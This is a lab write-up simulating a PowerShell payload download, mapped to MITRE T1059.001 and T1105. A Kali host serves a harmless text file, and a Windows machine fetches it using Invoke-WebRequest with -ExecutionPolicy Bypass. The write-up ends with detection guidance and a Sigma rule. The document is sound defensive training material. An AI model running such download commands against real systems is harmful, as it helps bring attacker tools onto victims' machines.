# Case 6 – PowerShell Download Payload

## Objective
Simulate a PowerShell attack where a Windows machine downloads a payload from a remote server using Invoke-WebRequest.

This technique is commonly used by attackers to download malware or additional tools.

MITRE ATT&CK Techniques:

T1059.001 – PowerShell  
T1105 – Ingress Tool Transfer

---

## Lab Environment

Attacker Machine:
Kali Linux

Target Machine:
Windows 10

Tool Used:
PowerShell
Python HTTP Server

---

## Attack Simulation

Step 1 – Create Payload on Kali

nano payload.txt

Example content:

This is a simulated payload

---

Step 2 – Start HTTP Server

python3 -m http.server 8000

---

Step 3 – Execute PowerShell Command on Windows

powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://192.168.100.20:8000/payload.txt -OutFile C:\Temp\payload.txt"

---

## Evidence

The payload file was successfully downloaded to:

C:\Temp\payload.txt

---

## Detection

Monitor Windows Security Logs for:

Event ID: 4688

Indicators:

powershell.exe  
Invoke-WebRequest  
http

---

## Screenshots

### 1 - Creating payload file on Kali
![Kali Payload](screenshots1.jpg)

### 2 - Writing payload content
![Payload Content](screenshots2.jpg)

### 3 - Starting HTTP Server on Kali
![HTTP Server](screenshots3.jpg)

### 4 - PowerShell Download Command
![PowerShell Command](screenshots4.jpg)

### 5 - Kali Receiving the Request
![Kali Request](screenshots5.jpg)

### 6 - Payload Downloaded on Windows
![Downloaded File](screenshots6.jpg)

### 7 - Event 4688 Showing PowerShell Invoke-WebRequest
![Event4688](screenshots7.jpg)

---

## Sigma Detection Rule

title: PowerShell Download Payload
status: experimental
description: Detect PowerShell downloading files from the internet
author: Wael SK
logsource:
  product: windows
  service: security

detection:
  selection:
    EventID: 4688
    CommandLine|contains:
      - Invoke-WebRequest
      - http

condition: selection

falsepositives:
  - Administrative scripts

level: medium

